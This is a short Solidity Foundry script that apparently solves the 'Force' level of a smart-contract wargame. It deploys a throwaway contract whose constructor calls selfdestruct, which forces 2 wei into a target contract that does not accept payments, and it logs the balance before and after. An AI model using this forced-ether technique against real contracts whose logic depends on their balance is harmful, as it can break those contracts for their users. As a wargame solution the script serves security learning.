// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import{Script,console} from "forge-std/Script.sol";


contract ToBeDestructed{
    constructor(address payable _forcedAddress) payable{
        selfdestruct(_forcedAddress);   //send funds to _forcedAddress 
    }
}
contract Level7Solution is Script{

        function run() external{
            address forcedAddress=0x7A1e3bD5bB198719822E769Aa5baC94BcFe38811; // instance of the Force Contract
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            console.log("balance",forcedAddress.balance);
            new ToBeDestructed{value:2 wei}(payable(forcedAddress));
            console.log("new balance",forcedAddress.balance);   
            vm.stopBroadcast();
        }
}
